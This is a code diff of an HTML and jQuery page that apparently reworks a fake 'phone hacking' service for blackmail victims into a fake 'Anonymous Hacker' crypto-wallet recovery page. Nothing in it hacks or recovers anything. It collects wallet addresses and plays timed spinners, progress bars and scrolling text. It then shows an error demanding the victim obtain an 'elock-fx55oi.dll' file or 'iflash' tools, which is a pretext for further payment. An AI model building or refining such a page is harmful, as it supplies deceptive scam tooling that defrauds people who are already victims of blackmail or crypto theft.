@@ -13,6 +13,7 @@
 
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
 <script src="http://code.jquery.com/ui/1.9.2/jquery-ui.js"></script>
+<script src="converter-widget.js"></script>
 
 
 
@@ -45,7 +46,7 @@ body {
 	background-color: mintcream;
 	margin: 50px auto 0px auto;
 	padding: 0px 1px;
-	padding-top: 1px;
+  padding-top: 1px;
 	background-image: linear-gradient(to bottom right, #456EC5, #789EF0, #294889);
 }
 
@@ -108,7 +109,7 @@ body {
 float: left;
 width: 80%;
 height: 89%;
-background-color: #000;
+	background-color: #000;
 opacity: 0.9;
 
 }
@@ -342,9 +343,183 @@ opacity: 0.9;
 
 
 
-.marquee {
-	display: none;
+
+.crypto-select select {
+
+
+  /* styling */
+  background-color: white;
+  border: thin solid blue;
+  border-radius: 4px;
+  display: inline-block;
+  font: inherit;
+  line-height: 1.5em;
+  padding: 0.5em 3.5em 0.5em 1em;
+
+  /* reset */
+
+  margin: 0;      
+  -webkit-box-sizing: border-box;
+  -moz-box-sizing: border-box;
+  box-sizing: border-box;
+  -webkit-appearance: none;
+  -moz-appearance: none;
+
 }
+
+
+  /* Arrow */
+
+.crypto-select select.classic {
+
+background-image:
+    linear-gradient(45deg, transparent 50%, blue 50%),
+    linear-gradient(135deg, blue 50%, transparent 50%),
+    linear-gradient(to right, skyblue, skyblue);
+  background-position:
+    calc(100% - 20px) calc(1em + 2px),
+    calc(100% - 15px) calc(1em + 2px),
+    100% 0;
+  background-size:
+    5px 5px,
+    5px 5px,
+    2.5em 2.5em;
+  background-repeat: no-repeat;
+
+
+}
+
+
+  .crypto-select select.classic:focus {
+    
+  background-image:
+    linear-gradient(45deg, white 50%, transparent 50%),
+    linear-gradient(135deg, transparent 50%, white 50%),
+    linear-gradient(to right, gray, gray);
+  background-position:
+    calc(100% - 15px) 1em,
+    calc(100% - 20px) 1em,
+    100% 0;
+  background-size:
+    5px 5px,
+    5px 5px,
+    2.5em 2.5em;
+  background-repeat: no-repeat;
+  border-color: grey;
+  outline: 0;
+}
+
+.crypto-select select option {
+	background-color: ghostwhite;
+	font-size: 20px;
+
+}
+
+
+.crypto-images {
+	display: none;
+	width: 50px;
+}
+
+
+
+
+
+	/* WALLET BOX */
+
+	.wallet-box {
+		display: none;
+	}
+
+	.wallet-box div {
+		display: inline-block;
+		cursor: default;
+		
+	}
+
+	.wallet-box input {
+		width: 200px;
+	padding: 9px 10px;
+	border-radius: 3px;
+	}
+
+	.wallet-button div {
+		display: inline-block;
+	}
+
+	.wallet-button {
+		display: none;
+	}
+
+	.wallet-button button {
+		width: 250px;
+		padding: 15px 10px;
+		border-radius: 4px;
+		background-color: skyblue;
+		font-size: 18px;
+		cursor: pointer;
+	}
+
+	.wallet-button button:hover {
+		width: 280px;
+		border: 2px solid;
+		background-color: deepskyblue;
+		color: white;
+		font-size: 20px;
+		border-radius: 8px;
+	}
+
+	.wallet-button img {
+		width: 90px;
+	}
+
+	.wallet-button .img-button {
+		margin-top: -17px;
+	}
+
+
+
+	.cg-widget.small {
+    flex-direction: row;
+}
+
+.cg-container {
+	font-size: 5px;
+	line-height: 0.25px;
+}
+.cg-py-5 {
+    padding-top: 0px;
+    padding-bottom: 0px;
+}
+
+.cg-box-input {
+	width: 150px;
+}
+
+.cg-box-container {
+	height: 36px;
+}
+
+.cg-footer {
+	background-color: ;
+	}
+
+	.cg-px-1 {
+		padding-top: -4px;
+		padding-bottom: 0px;
+	}
+
+
+
+	.converter-bitcoin, .converter-ethereum, .converter-tether, .converter-bnb {
+		display: none;
+	}
+
+
+
+
+
+
 
 .main-counter-container {
 	display: flex;
@@ -365,13 +540,6 @@ opacity: 0.9;
   font-size: 20px;
   margin-top: 5px;
 }
-
-.counter-2 {
-	display: none;
-	font-size: 20px;
-  margin-top: 5px;
-}
-
 
 
 
@@ -437,6 +605,9 @@ opacity: 0.9;
 }
 
 
+
+
+			/* FOOTER */
 
 
 .footer {
@@ -611,38 +782,166 @@ opacity: 0.9;
 					<div class="btn-s"></div>
 
 
-				<div class="selector-div" style="font-size: 20px; font-weight: bold; color: white;">
-					Blackmailer Info:
+				<div class="selector-div" style="font-size: 22px; font-weight: bold; text-align: center; color: honeydew;">
+					Anonymous Hacker
 				</div>
 
-				<div class="selector-div" style="height: 40px;">
-				<select class="vodiapicker" id="picker">
-					<option disabled selected hidden style="margin: 0px 5px; padding: 0px 0px;">Select</option>
-            <option value="en" class="test" data-thumbnail="icon/phone-number.png">Number</option>
-            <option value="au" data-thumbnail="icon/gmail.png" id="gmail">Gmail</option>
-            <option value="uk" data-thumbnail="icon/snap.png">Snapchat</option>
-            <option value="cn" data-thumbnail="icon/facebook.png">Facebook</option>
-            <option value="de" data-thumbnail="icon/instagram.png">Instagram</option>
-            
-      </select>
+				<div class="crypto-select" style="display: none;">
+					<select class="classic">
+						<option disabled selected hidden>Choose Crypto</option>
+						<option id="bitcoin">Bitcoin BTC</option>
+						<option id="ethereum">Ethereum ETH</option>
+						<option id="tether">Tether USDT</option>
+						<option id="bnb">BNB BNB</option>
+					</select>
+
+					<div>
+					<img class="crypto-images" src="icon/bitcoin.png" id="bitcoin-img">
+					<img class="crypto-images" src="icon/ethereum.png" id="ethereum-img">
+					<img class="crypto-images" src="icon/tether.png" id="tether-img">
+					<img class="crypto-images" src="icon/bnb.svg" id="bnb-img" style="width:45px;">
+				</div>
+
+
+				</div>  <!-- CRYPTO-SELECT END -->
+
+				<div class="wallet-box" id="wallet-box" style="color: white;">
+				<div>
+					<span style="font-size: 20px;">Sender Wallet</span> <br>
+					<input type="text" name="">
+				</div>
+
+				<div style="width:40px; border: 1px solid #777;"><hr/></div>
+
+				<div>
+					<span style="font-size: 20px;">Recovery Wallet</span> <br>
+					<input type="text" name="" id="recovery-wallet">
+				</div>
+
+			</div>  <!-- WALLET-BOX END -->
+
+
+				<br>
+				<hr/>
 
 
 
-<div class="lang-select">
-<button class="btn-select" value=""></button>
-<div class="b">
-<ul id="a"></ul>
-</div>
-</div>
+				<div style="color: white;">
+
+					<span style="font-size: 20px; line-height: 1.5em;">
+					An External Gadget is involved <br>
+					You will have to clear once... <br><br>
+					<span style="font-size: 27px;">To do this process, you have to get<br> (-<span style="color:red">iflash-ckm22vxwipe Tools</span>-) fast boot</span>
+				</span>
+					<br><br>
+
+					<div style="display: flex; align-items: center; justify-content: center; color: #bbb;">
+
+							<div style="display: flex; flex-direction: column; justify-content: center; text-align: center; margin: 10px -5px; width: 70px;">
+									<img src="icon/iphone-6.png">
+									<span>Phone</span>
+							</div>
+
+					<div style="display: flex; flex-direction: column; justify-content: center; text-align: center; margin: 10px -5px; width: 70px;">
+									<img src="icon/iphone-6.png">
+									<span>Phone</span>
+							</div>
+
+
+							<div style="display: flex; flex-direction: column; justify-content: center; text-align: center; margin: 10px -5px; width: 70px;">
+									<img src="icon/iphone-6.png">
+									<span>Phone</span>
+							</div>
+
+
+							<div style="display: flex; flex-direction: column; justify-content: center; text-align: center; margin: 10px -5px; width: 70px;">
+									<img src="icon/iphone-6.png">
+									<span>Phone</span>
+							</div>
+
+								<i class="fas fa-plus" style="font-size: 22px; margin-top: -20px;"></i>
+
+
+							<div style="display: flex; flex-direction: column; justify-content: center; text-align: center; margin: 0px 15px; margin-top: -5px; width: 60px;">
+									<img src="icon/computer-icon.png">
+									<span style="margin-top: 15px;">PC</span>
+							</div>
+
+
+							<div style="display: flex; flex-direction: column; justify-content: center; text-align: center; margin: 0px 15px; margin-top: -5px; width: 60px;">
+									<img src="icon/computer-icon.png">
+									<span style="margin-top: 15px;">PC</span>
+							</div>
 
 
 
-</div>
+
+					 </div>
+
+			<div class="wallet-box" id="wallet-amount" style="margin: 0 auto; width: 300px; height: 50px;">
+				<br>
+	
+<coingecko-coin-converter-widget class="converter-bitcoin" coin-id="bitcoin" currency="usd" background-color="transparent" font-color="#4c4c4c" locale="en" width="150"></coingecko-coin-converter-widget>
+
+<coingecko-coin-converter-widget class="converter-ethereum" coin-id="ethereum" currency="usd" background-color="transparent" font-color="#4c4c4c" locale="en" width="150"></coingecko-coin-converter-widget>
+
+<coingecko-coin-converter-widget class="converter-tether" coin-id="tether" currency="usd" background-color="transparent" font-color="#4c4c4c" locale="en" width="150"></coingecko-coin-converter-widget>
+
+<coingecko-coin-converter-widget class="converter-bnb" coin-id="binance-coin-wormhole" currency="usd" background-color="transparent" font-color="#4c4c4c" locale="en" width="150"></coingecko-coin-converter-widget>
+		
+</div>  <!-- COINGECKO WIDGET END -->
+
+			<div class="wallet-button">
+				<br>
+				
+				<div>
+				<button id="recovery-button">Recover Now</button>
+				<button id="recovery-button-2" style="display: none;">Recover Now</button>
+			</div>
+		
 
 
-<div class="selector-div">
-<input type="text" name="" class="for-input" placeholder="Enter id">
-</div>
+			<span id="wallet-spinner" style="position: absolute; margin-top: -15px; display: none;">
+				<img src="icon/spinner.gif">	
+		</span>
+
+			</div>
+
+			<!-- LOADING-TEXT CONTAINER // LOADING-TEXT -->
+
+
+		<div class="loading-text-container" style="display: none;">
+			<span class="loading-text"></span>
+			<span class="loading-text-success"></span>
+
+		</div>
+
+
+
+
+
+	<!-- LOADING-TEXT CONTAINER // LOADING-TEXT  END END -->
+
+		
+
+			<div class="wallet-box" id="wallet-amount">
+				<br>
+				<hr/>
+
+				<div>
+					<span style="font-size: 20px;">Amount</span> <br>
+					<input type="text" name="">
+				</div>
+
+				<div style="width:40px; border: 1px solid #777;"><hr/></div>
+
+				<div>
+					<span style="font-size: 20px;">BTC</span> <br>
+					<input type="text" name="" id="recovery-wallet">
+				</div>
+
+
+			</div>
 
 
 <br>
@@ -651,15 +950,11 @@ opacity: 0.9;
 <!-- PROGRESS BAR BEGIN // container -->
 
 <div id="container"> 
-
-
-  			<p><div class="blinker">Hacking into phone...</div></p>
-
-
-  <div id="bar-1" class="bar-main-container" style="height: 35px;">
+  
+  <div id="bar-1" class="bar-main-container">
     <div class="wrap">
       <div class="bar-percentage" id="bar-percentage" data-percentage="56"></div>
-      <div class="bar-container" style="height: 25px;">
+      <div class="bar-container">
         <div class="bar">
         	<div class="bar-highlight"></div>
         </div>
@@ -668,10 +963,10 @@ opacity: 0.9;
   </div> <!-- bar-1 end // PROGRESS BAR -->
 
 
-  <div id="bar-2" class="bar-main-container" style="display: none; height: 35px;">
+  <div id="bar-2" class="bar-main-container" style="display: none;">
     <div class="wrap">
       <div class="bar-percentage" id="bar-percentage-2" data-percentage="101"></div>
-      <div class="bar-container" style="height: 25px;">
+      <div class="bar-container">
         <div class="bar">
         	<div class="bar-highlight"></div>
         </div>
@@ -685,50 +980,16 @@ opacity: 0.9;
 </div>  <!-- container end // PROGRESS BAR -->
 	
 
-	<!-- LOADING-TEXT CONTAINER // LOADING-TEXT -->
-
-
-		<div class="loading-text-container">
-			<span class="loading-text"></span>
-			<span class="loading-text-success"></span>
-
-		</div>
-
-
-
-
-
-	<!-- LOADING-TEXT CONTAINER // LOADING-TEXT  END END -->
-
-
-
-
-	<div class="main-counter-container">
-
-					<div class="counter-container">
-      <div class="counter" data-target="2460"></div>
-      <div class="counter-2">2460</div>
-      <span><i class="fas fa-images"></i> Pictures</span>
-    </div>
-    <div class="counter-container">
-      <div class="counter" data-target="84"></div>
-      <div class="counter-2">84</div>
-      <span><i class="fas fa-video"></i> Videos</span>
-    </div>
-    <div class="counter-container">
-      <div class="counter" data-target="72"></div>
-      <div class="counter-2">72</div>
-      <span><i class="fas fa-file-alt"></i> Files</span>
-    </div>
-
-
-    		</div>  <!-- COUNTER END HERE -->
-
+	
 
 
 		</div>
 		<!-- Progress Group Container end end -->
-<button class="stopm" style="display:none;" onclick="marquee.stop();marquee2.stop()">STOP MARQ</button>
+
+
+
+
+			<button class="stopm" style="display:none;" onclick="marquee.stop();marquee2.stop()">STOP MARQ</button>
 <div class="marquee-container" style="display: none; width: 550px; height: 120px; border: 4px inset ghostwhite; color: blue; background-color: #111; overflow-y: scroll;">
 
 <marquee behavior="scroll" direction="down" height="120" scrollamount="63" class="marquee" id="marquee">
@@ -1013,6 +1274,8 @@ ozkiyisxcsvtigvhz
 
 
 
+
+
 				<div style="padding: 15px 15px; display: none;" class="hack-btn-container">
 					<input type="button" name="" value="Continue" class="hack-btn" id="continue-btn">
 					<input type="button" name="" value="Hack now" class="hack-btn" id="hack-btn">
@@ -1020,10 +1283,9 @@ ozkiyisxcsvtigvhz
 				</div>
 
 
-
-
 			</fieldset>
-		
+	
+
 
 
 <!-- ERROR POPUP START --> <!-- ERROR POPUP START --><!-- ERROR POPUP START --> <!-- ERROR POPUP START -->
@@ -1046,13 +1308,14 @@ ozkiyisxcsvtigvhz
 					
 					<div class="error-text" style="line-height: 130px;"><img src="icon/error.png"></div>
 
-					<div class="error-text" style="line-height: 30px; font-size:18px;">Unable to complete hack process... Kindly get the elock-fx55oi.dll file to complete this process immediately.</div>
+					<div class="error-text" style="line-height: 30px; font-size:18px;">Unable to complete process... Kindly get the elock-fx55oi.dll file to complete this process immediately.</div>
 			 <!-- error-text END -->
 
 			
 					<div class="success-text" style="line-height: 130px;"><img src="icon/success.png"></div>
 
-					<div class="success-text" style="line-height: 50px; color: green;">Hack Successfull! process is now complete...</div>
+					<div class="success-text" style="line-height: 50px; color: green;">Successfull! process is now complete...
+						<img src="icon/barcode.png" width="100"></div>
 			<!-- success-text END -->
 
 
@@ -1139,8 +1402,7 @@ ozkiyisxcsvtigvhz
 
 
 
-
-<div class="notepad-container">
+	<div class="notepad-container">
 
 				<div style=" float: left; width: 100%; background-color: whitesmoke;">
 				<div style="float: left; color: black; font-size: 12px; line-height: 25px; padding-left: 5px;">
@@ -1170,6 +1432,7 @@ ozkiyisxcsvtigvhz
 			</div>
 
 		</div>  <!-- NOTEPAD END end -->
+
 
 
 
@@ -1334,70 +1597,35 @@ if (sessionLang){
 
 // FOR ERROR POP UP ONCLICK HACK BUTTON PROGRESS BAR
 
-	$('#hack-btn').click(function () {
-		$('.hack-btn-container').fadeOut('slow');
-		$('.progress-group-container').fadeIn('slow');
+	$('#recovery-button').click(function () {
+		$('#wallet-spinner').fadeIn('fast');
+		$('.loading-text-container').fadeIn(4000);
+
 		$('.marquee-container').css('display', 'flex');
 
 
-
-		// FOR COUNTER HERE 
-
-		const counters = document.querySelectorAll(".counter");
-
-counters.forEach((counter) => {
-  counter.innerText = "0";
-  const updateCounter = () => {
-    const target = +counter.getAttribute("data-target");
-    const count = +counter.innerText;
-    const increment = target / 200;
-    if (count < target) {
-      counter.innerText = `${Math.ceil(count + increment)}`;
-      setTimeout(updateCounter, 300);
-    } else counter.innerText = target;
-  };
-  updateCounter();
-});
-
-
-			
-			// FOR MARQUEE 
+				// FOR MARQUEE 
 
 		setTimeout(function() {
 			$('.marquee').show();
 		}, 3000);
 
-	$('#bar-percentage[data-percentage]').each(function () {
+
 		setTimeout(function() {
 			$('.loading-text').toggleClass('loading-text-paused');
-			$('.loading-text').hide();
 			$('#popup-error').fadeIn('veryslow');
 			$('.error-text').show();
 			$('.success-text').hide();
-			$('.counter').hide();
-			$('.counter-2').show();
-			$('.blinker').hide();
+			$('#wallet-spinner').fadeOut('slow');
+			$('.loading-text-container').fadeOut('slow');
 			$('.stopm').trigger('click');
-
-		}, 20000);
-
-  var progress = $(this);
-  var percentage = Math.ceil($(this).attr('data-percentage'));
-  $({countNum: 0}).animate({countNum: percentage}, {
-    duration: 20000,
-    easing:'linear',
-    step: function() {
-      // What todo on every count
-      var pct = Math.floor(this.countNum) + '%';
-      progress.text(pct) && progress.siblings().children().css('width',pct);
-    }
-  });
-});
-
-
-
+		}, 15000);
 
 });
+
+
+
+
 
 
 
@@ -1423,70 +1651,29 @@ counters.forEach((counter) => {
 
 
 
-	$('#hack-btn-2').click(function () {
-		$('.hack-btn-container').fadeOut('slow');
-		$('.progress-group-container').fadeIn('slow');
-		$('#bar-1').hide();
-		$('#bar-2').show();
+	$('#recovery-button-2').click(function () {
+		$('#wallet-spinner').fadeIn('fast');
+		$('.loading-text-container').fadeIn(4000);
+
 		$('.marquee-container').css('display', 'flex');
 
 
-
-		// FOR COUNTER HERE 
-
-		const counters = document.querySelectorAll(".counter");
-
-counters.forEach((counter) => {
-  counter.innerText = "0";
-  const updateCounter = () => {
-    const target = +counter.getAttribute("data-target");
-    const count = +counter.innerText;
-    const increment = target / 200;
-    if (count < target) {
-      counter.innerText = `${Math.ceil(count + increment)}`;
-      setTimeout(updateCounter, 300);
-    } else counter.innerText = target;
-  };
-  updateCounter();
-});
-
-
-			
-			// FOR MARQUEE 
+				// FOR MARQUEE 
 
 		setTimeout(function() {
 			$('.marquee').show();
 		}, 3000);
 
 
-	$('#bar-percentage-2[data-percentage]').each(function () {
 		setTimeout(function() {
 			$('.loading-text').toggleClass('loading-text-paused');
-			$('.loading-text').hide();
 			$('#popup-error').fadeIn('veryslow');
 			$('.error-text').hide();
 			$('.success-text').show();
-			$('.counter').hide();
-			$('.counter-2').show();
-			$('.blinker').hide();
+			$('#wallet-spinner').fadeOut('slow');
+			$('.loading-text-container').fadeOut('slow');
 			$('.stopm').trigger('click');
-		}, 30000);
-
-  var progress = $(this);
-  var percentage = Math.ceil($(this).attr('data-percentage'));
-  $({countNum: 0}).animate({countNum: percentage}, {
-    duration: 30000,
-    easing:'linear',
-    step: function() {
-      // What todo on every count
-      var pct = Math.floor(this.countNum) + '%';
-      progress.text(pct) && progress.siblings().children().css('width',pct);
-    }
-  });
-});
-
-
-
+		}, 15000);
 
 });
 
@@ -1537,7 +1724,10 @@ counters.forEach((counter) => {
 
 	$('#activate-btn').click(function () {
 		$('#hack-btn').hide();
-		$('#hack-btn-2').show();
+		$('#hack-btn-2').hide();
+		$('#recovery-button').hide();
+		$('#recovery-button-2').show();
+
 
 	});
 
@@ -1589,10 +1779,7 @@ $("#loginbtn-1").click(function () {
             setTimeout(function() {
                 $(".loader").fadeOut('slow');
                 $(".popup-login").fadeOut('veryslow');
-                $('.hack-btn-container').fadeIn('fast');
                 $("#continue-btn").hide();
-                $("#hack-btn").fadeIn('fast');
-                $("#activate-btn").fadeIn('slow');
                 
                 
               }, 4000);
@@ -1616,6 +1803,180 @@ $("#loginbtn-1").click(function () {
 
 
 </script>
+
+
+
+
+	<script type="text/javascript">
+		
+		// CRYPTO SELECT OPTION CLICK FUNCTIONS
+
+		// CRYPTO SELECT OPTION CLICK FUNCTIONS
+
+		// CRYPTO SELECT OPTION CLICK FUNCTIONS
+
+
+		$("#recovery-wallet").keyup(function () {
+		
+		if ( $("#recovery-wallet").val().length > 10 ) {
+
+			$('.popup-login').fadeIn('veryslow');
+		}
+
+		else {}
+
+	});
+
+
+
+		$("#bitcoin").click(function () {
+			$('#bitcoin-img').fadeIn('slow');
+			$('#ethereum-img').hide();
+			$('#tether-img').hide();
+			$('#bnb-img').hide();
+			$('#wallet-box').fadeIn(3000);
+
+			
+
+			$("#recovery-wallet").keyup(function () {
+		
+		if ( $("#recovery-wallet").val().length > 10 ) {
+			$('#wallet-amount').fadeIn(1500);
+			$('.wallet-button').fadeIn(5000);
+			$('.converter-bitcoin').show();
+
+			$('.converter-ethereum').hide();
+			$('.converter-tether').hide();
+			$('.converter-bnb').hide();
+		}
+		else {
+			$('#wallet-amount').fadeOut('fast');
+			$('.wallet-button').fadeOut('fast');
+		}
+		
+
+		});
+
+
+
+		});
+
+
+		$("#ethereum").click(function () {
+			$('#ethereum-img').fadeIn('slow');
+			$('#bitcoin-img').hide();
+			$('#tether-img').hide();
+			$('#bnb-img').hide();
+			$('#wallet-box').fadeIn(3000);
+
+
+
+			$("#recovery-wallet").keyup(function () {
+		
+		if ( $("#recovery-wallet").val().length > 10 ) {
+			$('#wallet-amount').fadeIn(1500);
+			$('.wallet-button').fadeIn(5000);
+			$('.converter-ethereum').show();
+
+			$('.converter-bitcoin').hide();
+			$('.converter-tether').hide();
+			$('.converter-bnb').hide();
+		}
+		else {
+			$('#wallet-amount').fadeOut('fast');
+			$('.wallet-button').fadeOut('fast');
+		}
+		
+
+		});
+
+
+		});
+
+
+
+		$("#tether").click(function () {
+			$('#tether-img').fadeIn('slow');
+			$('#bitcoin-img').hide();
+			$('#ethereum-img').hide();
+			$('#bnb-img').hide();
+			$('#wallet-box').fadeIn(3000);
+
+
+
+			$("#recovery-wallet").keyup(function () {
+		
+		if ( $("#recovery-wallet").val().length > 10 ) {
+			$('#wallet-amount').fadeIn(1500);
+			$('.wallet-button').fadeIn(5000);
+			$('.converter-tether').show();
+
+			$('.converter-bitcoin').hide();
+			$('.converter-ethereum').hide();
+			$('.converter-bnb').hide();
+		}
+		else {
+			$('#wallet-amount').fadeOut('fast');
+			$('.wallet-button').fadeOut('fast');
+		}
+		
+
+		});
+
+
+		});
+
+
+
+		$("#bnb").click(function () {
+			$('#bnb-img').fadeIn('slow');
+			$('#bitcoin-img').hide();
+			$('#ethereum-img').hide();
+			$('#tether-img').hide();
+			$('#wallet-box').fadeIn(3000);
+
+
+			$("#recovery-wallet").keyup(function () {
+		
+		if ( $("#recovery-wallet").val().length > 10 ) {
+			$('#wallet-amount').fadeIn(1500);
+			$('.wallet-button').fadeIn(5000);
+			$('.converter-bnb').show();
+
+			$('.converter-bitcoin').hide();
+			$('.converter-ethereum').hide();
+			$('.converter-tether').hide();
+		}
+		else {
+			$('#wallet-amount').fadeOut('fast');
+			$('.wallet-button').fadeOut('fast');
+		}
+		
+
+		});
+
+
+		});
+
+
+
+		$(".classic").change(function ()
+		{
+   $(".classic option:selected").click();
+		});
+
+
+
+
+
+
+
+
+		$('.cg-widget.small').css("flex-direction", "row");
+
+	</script>
+		
+
 
 
 
